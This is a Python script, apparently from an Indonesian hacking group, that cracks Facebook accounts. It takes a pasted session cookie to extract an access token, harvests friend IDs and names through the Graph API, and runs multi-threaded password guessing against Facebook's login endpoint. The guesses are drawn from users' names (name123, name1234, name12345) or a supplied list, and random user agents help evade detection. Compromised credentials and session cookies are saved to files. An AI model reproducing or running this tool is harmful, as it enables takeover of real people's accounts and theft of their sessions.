# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,base64,bs4,datetime,json,time,random,platform,uuid
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
#from random import randint
ses = requests.Session()

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []
id,ids=[],[]
ok,cp,loop=0,0,0
akun,method=[],[]

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100010061977994','maushamsingh088']


# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# LOGO
def logo():
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
    
    
def login():
	try:
		ses = requests.Session()
		os.system('clear')
		logo()
		cok = input(f'\n{P} Masukan cookie anda :{B} ')
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok});find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'{P}cookie kamu invalid silahkan menggunakan tumbal/cookies lain.');time.sleep(2);exit()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok});took = re.search('(EAAB\w+)',xz.text).group(1);open('.tok.txt', 'a').write(took);open('.cok.txt', 'a').write(cok)
				print (f"\n{P} + token:{H} {took}");jeda(2)
				print (f"\n{H} √ login berhasil");jeda(2)
				menu()
	except Exception as e:exit(e)
    
    
# MENU
def menu():
    try:
        token = open(".tok.txt","r").read()
        cok = open(".cok.txt","r").read()    
        try:
            nama = request.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}", cookies = {'cookies':cok}).json()
        except:
            os.system('rm -rf cookie.txt && rm -rf token.txt')
    except (FileNotFoundError,KeyError,IOError):
        print (f"{M} ! cookie invalid");jeda(2);login()
    except requests.exceptions.ConnectionError:
        exit(f"{M} ! tidak ada koneksi")
    banner()
    print("")
    print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
    print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
    print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mLihat hasil crack')
    print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mSetting user agent')
    print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
    print()
    mulai = input(" [\x1b[1;97m?] \x1b[1;97mPILIH :\x1b[1;93m ")
    if mulai in "": exit(" Pilih yang Benar")
    elif mulai in "1":idt = input(f"\n{P} Masukan ID : ");dumping(idt,"",{"cookie":cok},token);atur_crack()
    elif mulai in "2":mail_name()
    elif mulai in "3":hasil()
    elif mulai in "4":j()
    elif mulai in "0":
        os.system("rm -rf .tok.txt");os.system("rm -rf .cok.txt");print(f"Sukses hapus Cookies");exit()
    
    
class dumping:
# CRACK PUBLIK
	def __init__(self,idt,fields,cookie,token):
		try:
			headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
			if len(id) == 0:
				params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
			else:
				params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
			url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
			for i in url["friends"]["data"]:
				id.append(i["id"]+"<=>"+i["name"]);print(f' {P}Jumlah  ID{M} :{H} {len(id)} ',end="\r")
			dumping(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
		except:pass
        
  
# CRACK PENCARIAN NAMA
def mail_name():
	try:
		print(f'\n{P} contoh: sayang,pengen,colmeks ')
		nama = input(f' nama orang: ')
		jumlah=int(input(' jumlah ID yang ingin di dump: '))
		if "90000" in str(jumlah):
			jumlah-=1
		if jumlah<90001:
			pass
		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
		domain = "@gmail.com" #,"@yahoo.com"
		for z in range(int(jumlah)):
			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
			if mail in id:pass
			else:id.append(mail)
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050);atur_crack()
	except:pass
    

# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 {P}1. Cek hasil akun {H}Berhasil{P}
 2. Cek hasil akun {K}Checkpoint{P}
 0. Kembali
	""")
	rom = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if rom in['']:
		exit("\n Isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n File tidak tersedia")
		else:
			print(f'\n {H}Hasil akun berhasil 👍')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍏---------------------------------------🍏")
			print (f"{P} Hasil tanggal: {file_nm} total: {P}{len(totalok)}")
			print(f"{P}🍏---------------------------------------🍏")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit(" File tidak tersedia")
		else:
			print(f'\n {K}Hasil akun checkpoint 👎')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍊---------------------------------------🍊")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}🍊---------------------------------------🍊")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n Isi yg benar")    
    
    
    
def atur_crack():
    for ngacak in id:
        ids.insert(0,ngacak)
    print("\n")
    cx=input(f" {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
    print()
    if cx in ('y'):
        manual()
    elif cx in ('t'):    
        print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode B-Graph')
        #print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
        #print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
        #print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
        auto()
        
def manual():
    print (f"{P} Contoh: sayang,anjing,123456")
    pwek=input(" Masukan password: ")
    if pwek in(''):
        exit("\n jangan kosong")
    elif len(pwek)<=5:
        exit("\n password minimal 6 huruf")    
    else:pass    
    print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode B-Graph')
    #print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
    #print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
    #print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
    men=input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
    if men in ["1"," 01"]: method.append("grap")
    print (f"\n\x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}⚡\n akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt\n{P}⚡ crack sedang berjalan...\n")
    with Romz_Xyz(max_workers=30) as titid:    
        for akun in id:
            pwx = []
            idz = akun.split('<=>')[0]
            pwx = pwek.split(",")
            #if men in['1']:
                #titid.submit(__romz__, uid, pwx,  "free.facebook.com")
            #elif men in['2']:
                #titid.submit(__romz__, uid, pwx,  "mbasic.facebook.com")
           # elif men in['3']:
               # titid.submit(__romz__, uid, pwx,  "m.facebook.com")
           # elif men in['4']:
               # titid.submit(__romz__, uid, pwx,  "x.facebook.com")
            if 'grap' in method:
                titid.submit(b_graph, idz, pwx)
           # else:
               # exit("\n isi yang benar")    
    print()
    exit(f"{P}CRACK SELESAI\nAkun OK : {H}{ok}\n{P}Akun CP : {K}{cp}")           

def auto():
    print()
    men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
    if men in ["1"," 01"]: method.append("grap")
    print (f"\n{P}⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}\n⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt\n{P}⚡ crack sedang berjalan... \n")
    with Romz_Xyz(max_workers=30) as titid:
        for akun in id:
            pwx = []
            idz,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
            na = name.split(' ')[0]
            if len(name)<6:
                if len(na)<3:
                    pass
                else:
                    pwx.append(name)
                    pwx.append(na+'123')
                    pwx.append(na+'12345')
                    pwx.append(na+'1234')    
            else:
                if len(na)<3:
                    pwx.append(name)
                else:
                    pwx.append(name)
                    pwx.append(na+'123')
                    pwx.append(na+'12345')
                    pwx.append(na+'1234')
           # if men in['1']:
                #titid.submit(__romz__, uid, pwx,  "free.facebook.com")
            #elif men in['2']:
               # titid.submit(__romz__, uid, pwx,  "mbasic.facebook.com")
            #elif men in['3']:
               # titid.submit(__romz__, uid, pwx,  "m.facebook.com")
            #elif men in['4']:
                #titid.submit(__romz__, uid, pwx,  "x.facebook.com")
            if 'grap' in method:
                titid.submit(b_graph, idz, pwx)
            #else:
               # exit("\n ! isi yang benar")
    print()
    exit(f"{P}CRACK SELESAI\nAkun OK : {H}{ok}\n{P}Akun CP : {K}{cp}")                          
                
                
  
def b_graph(idz, pwx):       
	global loop,ok,cp
	komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
	print(f"\r{komtol}B-Graph {P}{loop}/{len(id)} - {H}OK:-{ok} {K}CP:-{cp}",flush=True,end=" ")
	ses = requests.Session()
	for pw in pwx:
		try:
			ua = Ua_validate()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {
			"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
			"uid": idz,
			"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified",
			"flow": "login_no_pin",
			"pass":pw}
			hd = {"Host": "free.prod.facebook.com",
			"content-length": "479",
			"cache-control": "max-age=0",
			"upgrade-insecure-requests": "1",
			"origin": "https://free.prod.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"x-requested-with": "com.opera.mini.native",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1","sec-fetch-dest": "document",
			"referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={idz}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=hd, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}└──{H} {idz} ◊ {pw} \n{P} └─ {H}{kuki} \n ')
				#print(f"\r{H}{kuki}{N}")
				open('OK/'+okc,'a').write(idz+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				print (f'\r{P}└── {K}{idz} ◊ {pw}\n ')
				open('CP/'+cpc,'a').write(idz+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
	loop+=1
                
                
def Ua_validate():
	rr = random.randint
	rc = random.choice
	pek = rr(10,105)
	pekk = rc(["5.1","6.0.1","7.0","7.1.2","8.0.1","9","10","11","12","13"])
	pepek = rc([f"Version/{str(rr(2,4))}.0 Chrome/{pek}.0.{str(rr(1000,5500))}.{str(rr(45,250))}",f"Chrome/{pek}.0.{str(rr(1000,5500))}.{str(rr(45,250))}"])
	return1 = f"Mozilla/5.0 (Linux; Android 10; {pekk}; S40Pro Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"
	return2 = f"Mozilla/5.0 (Linux; Android {pekk}; V2203 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/360.0.0.7.53;]"
	return rc([return1,return2])
	Pepek = random.choice(['Pixel 3','Pixel 6 Pro','Pixel 4a','Pixel 5','Pixel 6a',])
	return f"Mozilla/5.0 (Linux; Android 10; S40Pro Build/QP1A.190711.020) {pekk}; {Pepek}) AppleWebKit/537.36 (KHTML, like Gecko) {pepek} Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36"
                
                    
    
if __name__ == "__main__":menu()    
